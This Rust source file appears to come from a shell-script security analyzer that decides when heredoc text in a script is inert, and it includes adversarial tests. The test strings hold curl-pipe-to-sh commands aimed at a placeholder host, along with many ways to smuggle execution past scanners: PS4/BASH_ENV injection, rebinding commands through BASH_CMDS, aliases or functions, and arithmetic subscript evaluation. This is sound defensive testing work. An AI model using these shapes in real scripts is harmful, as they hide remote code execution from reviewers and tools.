        if bytes.get(index + 1) == Some(&b'|') {
            index += 2;
            continue;
        }
        let mut next = index + 1;
        if bytes.get(next) == Some(&b'&') {
            next += 1;
        }
        let after = text[next..].trim_start_matches(|c: char| c.is_whitespace() || c == '\\');
        let word_end = after
            .find(|c: char| c.is_whitespace() || matches!(c, ';' | '|' | '&' | ')' | '<' | '>'))
            .unwrap_or(after.len());
        if TEXT_FILTERS.contains(&&after[..word_end]) {
            index = next;
            continue;
        }
        match case_pattern_alternative(bytes, index) {
            Some(close) => index = close + 1,
            None => return false,
        }
    }
    true
}

/// Characters a simple `case` pattern alternative may hold.
fn pattern_byte(byte: u8) -> bool {
    byte.is_ascii_alphanumeric() || b"-_.*?\"'=+,:/~@%[]!|".contains(&byte)
}

/// `-h|--help)` in a `case` arm list: a pattern of plain pattern characters
/// up to its `)`, starting right after `case WORD in` or a `;;` / `;&` arm
/// end, on its own line or the previous line. Outside a case statement that
/// shape is a syntax error, so nothing in it runs. Returns the offset of
/// the pattern's `)`. Every scan is local to the pattern and the line(s)
/// right before it.
fn case_pattern_alternative(bytes: &[u8], bar: usize) -> Option<usize> {
    let mut start = bar;
    while start > 0 && pattern_byte(bytes[start - 1]) {
        start -= 1;
    }
    let mut close = bar + 1;
    while close < bytes.len() && pattern_byte(bytes[close]) {
        close += 1;
    }
    if start == bar || bytes[start] == b'|' || bytes.get(close) != Some(&b')') {
        return None;
    }
    let blank = |byte: u8| matches!(byte, b' ' | b'\t');
    let mut before = start;
    while before > 0 && blank(bytes[before - 1]) {
        before -= 1;
    }
    let arm_end = |end: usize| end >= 2 && matches!(&bytes[end - 2..end], b";;" | b";&");
    if arm_end(before) || after_case_in(bytes, before) {
        return Some(close);
    }
    if before > 0 && bytes[before - 1] != b'\n' {
        return None;
    }
    // The pattern starts its line: the previous non-blank line must end an
    // arm or be `case WORD in`.
    let mut end = before;
    while end > 0 && bytes[end - 1].is_ascii_whitespace() {
        end -= 1;
    }
    (end > 0 && (arm_end(end) || after_case_in(bytes, end))).then_some(close)
}

/// Whether `bytes[..end]` ends with `case WORD in` that starts its line.
fn after_case_in(bytes: &[u8], end: usize) -> bool {
    let Some(rest) = end.checked_sub(2) else {
        return false;
    };
    if &bytes[rest..end] != b"in" || rest == 0 || !matches!(bytes[rest - 1], b' ' | b'\t') {
        return false;
    }
    let mut cursor = rest - 1;
    while cursor > 0 && matches!(bytes[cursor - 1], b' ' | b'\t') {
        cursor -= 1;
    }
    let word_end = cursor;
    while cursor > 0 && !bytes[cursor - 1].is_ascii_whitespace() && word_end - cursor <= 256 {
        cursor -= 1;
    }
    if cursor == word_end || word_end - cursor > 256 {
        return false;
    }
    let Some(keyword) = cursor.checked_sub(5) else {
        return false;
    };
    if &bytes[keyword..cursor] != b"case " {
        return false;
    }
    let mut line = keyword;
    while line > 0 && matches!(bytes[line - 1], b' ' | b'\t') {
        line -= 1;
    }
    line == 0 || bytes[line - 1] == b'\n'
}

/// Every `>` only reorders stdout/stderr or discards output.
fn redirects_only_reorder(text: &str) -> bool {
    let bytes = text.as_bytes();
    let mut index = 0usize;
    while index < bytes.len() {
        if bytes[index] != b'>' {
            index += 1;
            continue;
        }
        let mut next = index + 1;
        if bytes.get(next) == Some(&b'>') {
            next += 1;
        }
        let ok = if bytes.get(next) == Some(&b'&') {
            matches!(bytes.get(next + 1), Some(b'1' | b'2'))
                && !bytes.get(next + 2).is_some_and(u8::is_ascii_alphanumeric)
        } else {
            let target = text[next..].trim_start_matches([' ', '\t']);
            ["/dev/null", "/dev/stderr", "/dev/stdout"]
                .iter()
                .any(|path| {
                    target.strip_prefix(path).is_some_and(|after| {
                        after
                            .chars()
                            .next()
                            .is_none_or(|c| c.is_whitespace() || matches!(c, ';' | '&' | '|' | ')'))
                    })
                })
        };
        if !ok {
            return false;
        }
        index = next;
    }
    true
}

/// Every `${...}` and `$[...]` in `text`, from the `$` through the closer.
/// Brackets nest. A quote, backslash or backtick inside one, or a closer
/// that does not match, leaves the open ones running to the end of `text`
/// (fail closed: the shell's own matching may differ).
fn expansion_ranges(text: &str) -> Vec<Range<usize>> {
    let bytes = text.as_bytes();
    let mut ranges = Vec::new();
    // (start, closer, is an expansion)
    let mut open: Vec<(usize, u8, bool)> = Vec::new();
    let mut index = 0usize;
    while index < bytes.len() {
        let byte = bytes[index];
        if byte == b'$' && matches!(bytes.get(index + 1), Some(b'{' | b'[')) {
            let closer = if bytes[index + 1] == b'{' { b'}' } else { b']' };
            open.push((index, closer, true));
            index += 2;
            continue;
        }
        if !open.is_empty() {
            match byte {
                b'{' => open.push((index, b'}', false)),
                b'[' => open.push((index, b']', false)),
                b'}' | b']' if open.last().is_some_and(|top| top.1 == byte) => {
                    let (start, _, expansion) = open.pop().expect("checked non-empty");
                    if expansion {
                        ranges.push(start..index + 1);
                    }
                }
                b'}' | b']' | b'\'' | b'"' | b'\\' | b'`' => break,
                _ => {}
            }
        }
        index += 1;
    }
    ranges.extend(
        open.into_iter()
            .filter(|(_, _, expansion)| *expansion)
            .map(|(start, ..)| start..bytes.len()),
    );
    ranges
}

/// A `printf` command (`masked` with its quoted bytes replaced, `raw` the
/// same bytes as written) that only prints: no `-v` (also quoted, joined
/// to the name, after a redirection, or made by brace, tilde or glob
/// expansion of the format word: `{-v,X}`, `~-`, `[-]v`, `@(-v)`), and a
/// literal format whose conversions only take strings (`%s`, `%b`, `%q`,
/// `%c`): ksh and zsh evaluate the argument of a numeric conversion or a
/// `*` width as arithmetic.
fn printf_only_prints(masked: &str, raw: &str) -> bool {
    if raw.split_whitespace().any(|word| word == "-v") {
        return false;
    }
    // Words by the masked text, where quoted whitespace is not a separator.
    let mut ranges = Vec::new();
    let mut word_start = None;
    for (index, byte) in masked.bytes().enumerate() {
        match (byte.is_ascii_whitespace(), word_start) {
            (true, Some(start)) => {
                ranges.push(start..index);
                word_start = None;
            }
            (false, None) => word_start = Some(index),
            _ => {}
        }
    }
    if let Some(start) = word_start {
        ranges.push(start..masked.len());
    }
    let mut words = ranges
        .into_iter()
        .map(|range| (&masked[range.clone()], &raw[range]))
        .skip_while(|(word, _)| HEADER_PREFIXES.contains(word));
    if words.next().map(|(word, _)| word) != Some("printf") {
        return false;
    }
    let mut end_of_options = false;
    loop {
        let Some((unquoted, word)) = words.next() else {
            return false;
        };
        // A redirection before the format (`>&2`, `2>/dev/null`, or `>`
        // followed by its target) does not end the options.
        if unquoted.contains(['>', '<']) {
            if unquoted.ends_with(['>', '<', '&']) {
                words.next();
            }
            continue;
        }
        if unquoted.contains(['{', '[', '*', '?', '~', '(', '`', '$']) {
            return false;
        }
        let bare: String = word
            .chars()
            .filter(|c| !matches!(c, '\'' | '"' | '\\'))
            .collect();
        if bare.starts_with(['$', '`', '~']) || bare.contains(['$', '`']) {
            return false;
        }
        if bare == "--" && !end_of_options {
            end_of_options = true;
            continue;
        }
        if bare.starts_with('-') && !end_of_options {
            return false;
        }
        let format: String = word.chars().filter(|c| !matches!(c, '\'' | '"')).collect();
        return string_conversions_only(&format);
    }
}

/// Every `%` conversion in a printf `format` is `%%` or takes a string
/// (`%s`, `%b`, `%q`, `%c`), with flags and a literal width / precision
/// only.
fn string_conversions_only(format: &str) -> bool {
    let bytes = format.as_bytes();
    let mut index = 0usize;
    while index < bytes.len() {
        if bytes[index] != b'%' {
            index += 1;
            continue;
        }
        index += 1;
        if bytes.get(index) == Some(&b'%') {
            index += 1;
            continue;
        }
        while bytes
            .get(index)
            .is_some_and(|byte| matches!(byte, b'-' | b'+' | b' ' | b'#' | b'0'..=b'9' | b'.'))
        {
            index += 1;
        }
        if !bytes
            .get(index)
            .is_some_and(|byte| matches!(byte, b's' | b'b' | b'q' | b'c'))
        {
            return false;
        }
        index += 1;
    }
    true
}

/// Every mention of `name` is a plain `$name` / `${name}` expansion in an
/// `echo` or `printf` command that only prints (see [`printf_only_prints`]),
/// outside any substitution, any other heredoc's body and any other
/// `${...}` / `$[...]` (`expansions`, see [`expansion_ranges`]). `quoted`
/// holds the sorted quoted regions of `text` (see [`quoted_regions`]).
fn variable_only_printed(
    text: &str,
    name: &str,
    substitutions: &[Range<usize>],
    other_bodies: &[Range<usize>],
    quoted: &[Range<usize>],
    expansions: &[Range<usize>],
) -> bool {
    let bytes = text.as_bytes();
    let ident = |byte: u8| byte.is_ascii_alphanumeric() || byte == b'_';
    let mut search = 0usize;
    let mut mentions = 0usize;
    while let Some(offset) = text[search..].find(name) {
        let at = search + offset;
        mentions += 1;
        if mentions > MAX_VARIABLE_MENTIONS {
            return false;
        }
        let end = at + name.len();
        search = end;
        if (at > 0 && ident(bytes[at - 1])) || bytes.get(end).copied().is_some_and(ident) {
            continue;
        }
        let plain = (at >= 1 && bytes[at - 1] == b'$')
            || (at >= 2 && &bytes[at - 2..at] == b"${" && bytes.get(end) == Some(&b'}'));
        if !plain {
            return false;
        }
        if substitutions
            .iter()
            .chain(other_bodies)
            .any(|range| range.contains(&at))
        {
            return false;
        }
        // Inside another `${...}` or `$[...]` the value may be evaluated as
        // arithmetic (`${a[$X]}`, `${HOME:$X}`, `$[$X]`), which runs
        // command substitutions in its array subscripts.
        if expansions
            .iter()
            .any(|range| range.contains(&at) && range.start + 2 != at)
        {
            return false;
        }
        // The command around it, split at `;`, `&&`, `||` and newlines.
        let line_start = text[..at].rfind('\n').map_or(0, |offset| offset + 1);
        let line_end = text[at..]
            .find('\n')
            .map_or(text.len(), |offset| at + offset);
        if line_end - line_start > MAX_LINE {
            return false;
        }
        // A backslash-newline joins this line to a neighbour, and a quoted
        // word an earlier line opened carries on into this one, so the
        // command that uses the variable may start on another line (fail
        // closed).
        let previous_line = text[..line_start.saturating_sub(1)]
            .rfind('\n')
            .map_or(0, |offset| offset + 1);
        if (line_start > 0 && ends_in_continuation(&text[previous_line..line_start]))
            || ends_in_continuation(&text[line_start..line_end])
            || inside(quoted, line_start)
        {
            return false;
        }
        // Quoted text holds no separator and no command word: read the line
        // with every quoted byte replaced.
        let mut line = text.as_bytes()[line_start..line_end].to_vec();
        let first = quoted.partition_point(|region| region.end <= line_start);
        for region in quoted[first..]
            .iter()
            .take_while(|region| region.start < line_end)
        {
            let from = region.start.max(line_start) - line_start;
            let to = region.end.min(line_end) - line_start;
            line[from..to].fill(b'x');
        }
        let Ok(line) = String::from_utf8(line) else {
            return false;
        };
        let mention = at - line_start;
        // A lone `&` starts another command on the same line.
        if has_background_separator(&line[..mention]) {
            return false;
        }
        let mut command_start = 0;
        for separator in [";", "&&", "||"] {
            if let Some(offset) = line[..mention].rfind(separator) {
                command_start = command_start.max(offset + separator.len());
            }
        }
        let mut command_end = line.len();
        for separator in [";", "&&", "||"] {
            if let Some(offset) = line[mention..].find(separator) {
                command_end = command_end.min(mention + offset);
            }
        }
        let raw = &text[line_start + command_start..line_start + command_end];
        let printer = match after_prefixes(&line[command_start..command_end]).next() {
            Some("echo") => true,
            Some("printf") => printf_only_prints(&line[command_start..command_end], raw),
            _ => false,
        };
        if !printer {
            return false;
        }
    }
    true
}

#[cfg(test)]
mod tests {
    use super::analyze;

    /// Defence in depth: a shell started from `$SHELL` / `$BASH`, or any
    /// command word that is an expansion, disables masking on its own,
    /// whatever the per-variable use check concludes.
    #[test]
    fn shell_variables_and_expansion_command_words_disable_masking() {
        let none = std::collections::BTreeMap::new();
        let inert = |rest: &str| super::rest_is_inert(rest, &[], &none, &[]);
        let executing = [
            "echo start & $SHELL -c \"$USAGE\"\n",
            "echo start & \"$BASH\" -c \"$USAGE\"\n",
            "env \"${SHELL}\" -c \"$USAGE\"\n",
            "x=1; \"$RUN\" -c \"$USAGE\"\n",
            "if true; then ${SH:-/bin/sh} -c \"$USAGE\"; fi\n",
            "nohup ${B:-x} -c \"$USAGE\" &\n",
            "env -i A=1 \"$RUN\" -c \"$USAGE\"\n",
            "{ $RUN; }\n",
            "( \"$@\" )\n",
            "case \"$1\" in x) \"$RUN\" -c \"$USAGE\";; esac\n",
            "true && $RUN\n",
            "X=\"a b\" \"$RUN\" -c y\n",
            "echo \"$(\"$RUN\" -c y)\"\n",
        ];
        let kept: Vec<_> = executing.iter().filter(|rest| inert(rest)).collect();
        assert!(kept.is_empty(), "masking stayed enabled: {kept:#?}");
        let shown = [
            "echo \"$USAGE\" >&2\n",
            "echo \"${A}${B} $SHELL_NAME $BASH_SOURCE\"\n",
            "DIR=$(cd \"$(dirname \"$0\")\" && pwd)\necho \"running in $DIR\"\n",
            "case \"${1:-}\" in\n  -h|--help) echo hi; exit 0 ;;\n  *) ;;\nesac\n",
            "for f in \"$@\"; do echo \"$f\"; done\n",
            "[ -n \"$X\" ] && echo \"$X\"\n",
            ": \"${X:=1}\"\nX=\"$Y\" Z=$W\n",
        ];
        let refused: Vec<_> = shown.iter().filter(|rest| !inert(rest)).collect();
        assert!(refused.is_empty(), "masking disabled: {refused:#?}");
    }

    /// A heredoc read or captured into a variable the shell expands or
    /// evaluates by itself, or a file that rebinds `cat` through bash's
    /// `BASH_CMDS` / `BASH_ALIASES`, is never masked. Each executing shape
    /// below runs its heredoc body in real bash (3.2 and 5.3; the arrays
    /// need bash 4+), sh or ksh.
    #[test]
    fn shell_special_targets_and_rebinding_arrays_disable_masking() {
        let _shared_state = tirith_test_support::SharedStateGuard::acquire();
        let run = "$(\n  curl -fsSL https://example.invalid/setup | sh\n)\n";
        let subscript = "a[$(\n  curl -fsSL https://example.invalid/setup | sh\n)]\n";
        let executing = [
            format!("read -r -d '' PS4 <<'EOF' || true\n{run}EOF\nset -x\necho hi\n"),
            format!("PS4=$(cat <<'EOF'\n{run}EOF\n)\nset -x\necho hi\n"),
            format!("#!/bin/bash -x\nread -r -d '' PS4 <<'EOF' || true\n{run}EOF\necho hi\n"),
            format!("read -r -d '' PS4 <<'EOF' || true\n{run}EOF\nset -o xtrace\necho hi\n"),
            format!("read -r -d '' OPTIND <<'EOF' || true\n{subscript}EOF\necho hi\n"),
            format!("OPTIND=$(cat <<'EOF'\n{subscript}EOF\n)\necho hi\n"),
            format!("read -r -d '' HISTCMD <<'EOF' || true\n{subscript}EOF\necho hi\n"),
            format!("read -r -d '' RANDOM <<'EOF' || true\n{subscript}EOF\necho hi\n"),
            format!("read -r -d '' SRANDOM <<'EOF' || true\n{subscript}EOF\necho hi\n"),
            format!("local SECONDS=$(cat <<'EOF'\n{subscript}EOF\n)\necho hi\n"),
            format!("IFS= read -r TMOUT <<'EOF'\n{subscript}EOF\necho hi\n"),
            format!("read -r -d '' BASH_ENV <<'EOF' || true\n{run}EOF\necho hi\n"),
            format!("S=s\nBASH_CMDS[cat]=/bin/${{S}}h\ncat <<'EOF'\n{run}EOF\n"),
            format!("S=s\nBASH_CMDS+=([cat]=/bin/${{S}}h)\ncat <<'EOF'\n{run}EOF\n"),
            format!(
                "shopt -s expand_aliases\nS=s\nBASH_ALIASES[cat]=/bin/${{S}}h\ncat <<'EOF'\n{run}EOF\n"
            ),
            format!("S=s\nBASH_ALIASES+=([cat]=/bin/${{S}}h)\ncat <<'EOF'\n{run}EOF\n"),
        ];
        let masked: Vec<_> = executing
            .iter()
            .filter(|text| {
                let view = analyze(text);
                view.masked.is_some() || view.live_bodies.is_empty()
            })
            .collect();
        assert!(masked.is_empty(), "heredoc masked: {masked:#?}");
        let shown = [
            format!("read -r -d '' USAGE <<'EOF' || true\n{run}EOF\necho \"$USAGE\"\n"),
            format!("HELP_TEXT=$(cat <<'EOF'\n{run}EOF\n)\necho \"$HELP_TEXT\" >&2\n"),
            format!("cat <<'EOF'\n{run}EOF\necho \"${{BASH_SOURCE[0]}}\"\n"),
        ];
        let refused: Vec<_> = shown
            .iter()
            .filter(|text| analyze(text).masked.is_none())
            .collect();
        assert!(refused.is_empty(), "masking disabled: {refused:#?}");
    }

    /// A header command redefined as a function (also under a spelling the
    /// word scan cannot read: a backslash, quotes or an expansion inside the
    /// name), an evaluating word spelled around, a `printf` whose `-v` sits
    /// after a redirection, and a printed variable that the shell evaluates
    /// as arithmetic (a subscript or substring offset, `$[...]`, or a ksh
    /// numeric `printf` conversion) all leave the heredoc live. Each
    /// executing shape below runs its heredoc body in at least one of real
    /// bash 3.2, bash 5.3, sh, dash, ksh or zsh.
    #[test]
    fn rebound_header_commands_printf_redirects_and_arithmetic_uses_disable_masking() {
        let _shared_state = tirith_test_support::SharedStateGuard::acquire();
        let run = "  curl -fsSL https://example.invalid/setup | sh\n";
        let ps4 = "$(\n  curl -fsSL https://example.invalid/setup | sh\n)\n";
        let subscript = "b[$(\n  curl -fsSL https://example.invalid/setup | sh\n)]\n";
        let read = |body: &str| format!("read -r -d '' USAGE <<'EOF' || true\n{body}EOF\n");
        let capture = |body: &str| format!("USAGE=$(cat <<'EOF'\n{body}EOF\n)\n");
        let cat = format!("cat <<'EOF'\n{run}EOF\n");
        let executing = [
            // A function replaces a header command and starts a hidden shell.
            format!("read() {{ /bin/s\\h; }}\n{}echo \"$USAGE\"\n", read(run)),
            format!("function read {{ s\\h; }}\n{}echo \"$USAGE\"\n", read(run)),
            format!("'read'() {{ /bin/s''h; }}\n{}echo \"$USAGE\"\n", read(run)),
            format!("re${{E}}ad() {{ /bin/s${{E}}h; }}\n{}echo \"$USAGE\"\n", read(run)),
            format!("c\\at() {{ /bin/s\\h; }}\n{cat}"),
            format!("'cat'() {{ /bin/s\\h; }}\n{cat}"),
            format!(
                "local() {{ /bin/s\\h -c \"${{1#*=}}\"; }}\nf() {{\nlocal USAGE=$(cat <<'EOF'\n{run}EOF\n)\n}}\nf\n"
            ),
            // An evaluating word spelled around the word scan.
            format!("ha\\sh -p /bin/s\\h cat\n{cat}"),
            format!("h''ash -p /bin/s''h cat\n{cat}"),
            format!("al\\ias cat=/bin/s\\h\n{cat}"),
            format!("'alias' cat=/bin/s''h\n{cat}"),
            format!("al${{E}}ias cat=/bin/s${{E}}h\n{cat}"),
            format!("$'\\x61lias' cat=/bin/s$'\\x68'\n{cat}"),
            // zsh rebinds `cat` through its parameter tables, `path` and
            // autoloaded functions.
            format!("functions[cat]='/bin/s\\h'\n{cat}"),
            format!("S=s\ncommands[cat]=/bin/${{S}}h\n{cat}"),
            format!("S=s\naliases[cat]=/bin/${{S}}h\n{cat}"),
            format!("path=(./bin $path)\n{cat}"),
            format!("fpath=(./fn $fpath)\nautoload -Uz cat\n{cat}"),
            // `printf -v` after a redirection still assigns.
            format!("{}printf >&2 -vPS4 '%s' \"$USAGE\"\nset -x\necho hi\n", read(ps4)),
            format!("{}printf >&2 '-v' PS4 '%s' \"$USAGE\"\nset -x\necho hi\n", read(ps4)),
            format!("{}printf 2>/dev/null -vPS4 '%s' \"$USAGE\"\nset -x\necho hi\n", read(ps4)),
            format!("{}printf >&2 {{-v,PS4}} '%s' \"$USAGE\"\nset -x\necho hi\n", read(ps4)),
            format!("{}printf > /dev/null -vPS4 '%s' \"$USAGE\"\nset -x\necho hi\n", read(ps4)),
            format!("{}printf >&2 -- -vX\nprintf >&2 -vPS4 %s \"$USAGE\"\nset -x\n", read(ps4)),
            // The printed variable is evaluated as arithmetic.
            format!("{}echo \"${{a[$USAGE]}}\"\n", read(subscript)),
            format!("{}echo \"${{a[$USAGE]}}\"\n", capture(subscript)),
            format!("{}printf '%s\\n' \"${{a[$USAGE]}}\"\n", read(subscript)),
            format!("{}echo \"${{HOME:$USAGE}}\"\n", read(subscript)),
            format!("{}echo \"${{HOME:0:$USAGE}}\"\n", read(subscript)),
            format!("{}echo $[$USAGE]\n", read(subscript)),
            format!("{}echo ${{a[\n$USAGE]}}\n", read(subscript)),
            format!("{}printf '%d\\n' \"$USAGE\"\n", read(subscript)),
            format!("{}printf '%d\\n' \"$USAGE\"\n", capture(subscript)),
            format!("{}printf '%i %x' \"$USAGE\" 1\n", read(subscript)),
            format!("{}printf '%*s|\\n' \"$USAGE\" x\n", read(subscript)),
            format!("{}printf '%s %d\\n' x \"$USAGE\"\n", read(subscript)),
            format!("{}printf -- '%d\\n' \"$USAGE\"\n", read(subscript)),
            format!("F='%d'\n{}printf \"$F\" \"$USAGE\"\n", read(subscript)),
            format!("F='%d'\n{}printf \"%s$F\" x \"$USAGE\"\n", read(subscript)),
        ];
        let masked: Vec<_> = executing
            .iter()
            .filter(|text| {
                let view = analyze(text);
                view.masked.is_some() || view.live_bodies.is_empty()
            })
            .collect();
        assert!(masked.is_empty(), "heredoc masked: {masked:#?}");
        let shown = [
            format!("{}echo \"$USAGE\"\n", read(run)),
            format!("{}echo \"${{USAGE}}\" >&2\n", read(run)),
            format!("{}printf >&2 '%s\\n' \"$USAGE\"\n", read(run)),
            format!(
                "{}printf 2>/dev/null -- '%-10s: %5.2s %b %q %c %%\\n' \"$USAGE\"\n",
                read(run)
            ),
            format!("{}echo \"${{HOME}}: ${{1:-}} $USAGE\"\n", capture(run)),
            format!("usage() {{\n  cat <<'EOF'\n{run}EOF\n}}\nusage\n"),
            format!("{cat}echo 'path: see the docs'\n"),
        ];
        let refused: Vec<_> = shown
            .iter()
            .filter(|text| analyze(text).masked.is_none())
            .collect();
        assert!(refused.is_empty(), "masking disabled: {refused:#?}");
    }

    /// CPU time the calling thread has used so far.
    ///
    /// Wall-clock time also counts the time the thread waits for a CPU, so on
    /// a loaded host (the parallel workspace test run) linear work looked slow.
    /// A thread's CPU time is never more than its wall time, so a bound on it
    /// is never stricter than the same bound on wall time.
    #[cfg(unix)]
    fn thread_cpu_time() -> std::time::Duration {
        let mut now = libc::timespec {
            tv_sec: 0,
            tv_nsec: 0,
        };
        // SAFETY: `now` is a valid, writable timespec for the call.
        let rc = unsafe { libc::clock_gettime(libc::CLOCK_THREAD_CPUTIME_ID, &mut now) };
        assert_eq!(
            rc,
            0,
            "CLOCK_THREAD_CPUTIME_ID: {}",
            std::io::Error::last_os_error()
        );
        std::time::Duration::new(
            u64::try_from(now.tv_sec).expect("non-negative seconds"),
            u32::try_from(now.tv_nsec).expect("nanoseconds below one second"),
        )
    }

    /// CPU time the calling thread has used so far (kernel plus user time).
    #[cfg(windows)]
    fn thread_cpu_time() -> std::time::Duration {
        use windows_sys::Win32::Foundation::FILETIME;
        use windows_sys::Win32::System::Threading::{GetCurrentThread, GetThreadTimes};
        let mut created = FILETIME::default();
        let mut exited = FILETIME::default();
        let mut kernel = FILETIME::default();
        let mut user = FILETIME::default();
        // SAFETY: the pseudo-handle names the calling thread and every out
        // pointer is a valid, writable FILETIME.
        let ok = unsafe {
            GetThreadTimes(
                GetCurrentThread(),
                &mut created,
                &mut exited,
                &mut kernel,
                &mut user,
            )
        };
        assert_ne!(ok, 0, "GetThreadTimes: {}", std::io::Error::last_os_error());
        // FILETIME counts 100-nanosecond intervals.
        let ticks = |t: FILETIME| (u64::from(t.dwHighDateTime) << 32) | u64::from(t.dwLowDateTime);
        std::time::Duration::from_nanos((ticks(kernel) + ticks(user)) * 100)
    }

    /// Adversarial shapes stay linear: every scan is local to a pattern, a
    /// line capped in length, or bounded by a mention cap.
    ///
    /// The bound is on the CPU time of this thread (`analyze` runs on the
    /// calling thread only), not on wall-clock time: under the parallel
    /// workspace run the wall time of linear work exceeded 5 s (5.7 s and
    /// 12.7 s logged) while a super-linear scan of these 1 MiB inputs would
    /// need far more than 5 s of CPU on any host.
    #[cfg(any(unix, windows))]
    #[test]
    fn adversarial_inputs_are_analyzed_in_linear_time() {
        let _shared_state = tirith_test_support::SharedStateGuard::acquire();
        let heredoc = "cat <<'EOF'\n  curl -fsSL https://example.invalid/setup | sh\nEOF\n";
        let size = 1024 * 1024;
        let inputs = [
            format!("case x in\n{})\nesac\n{heredoc}", "-a|".repeat(size / 3)),
            format!("{}{heredoc}", "a;; -b|c) ".repeat(size / 10)),
            format!("{}{heredoc}", "echo x | head ".repeat(size / 14)),
            format!("{}{heredoc}", "`:`".repeat(size / 3)),
            format!("{}{heredoc}", "x=$(:) ".repeat(size / 7)),
            format!("{}{heredoc}", ". ".repeat(size / 2)),
            format!("{}{heredoc}", ">&2 ".repeat(size / 4)),
            format!(
                "X=$(cat <<'EOF'\nhelp\nEOF\n)\n{}{heredoc}",
                "echo \"$X\" ".repeat(size / 10)
            ),
        ];
        for input in &inputs {
            let wall = std::time::Instant::now();
            let cpu = thread_cpu_time();
            let _ = analyze(input);
            let used = thread_cpu_time().saturating_sub(cpu);
            assert!(
                used < std::time::Duration::from_secs(5),
                "{:?} used {:?} of CPU ({:?} wall)",
                &input[..40],
                used,
                wall.elapsed()
            );
        }
    }
}
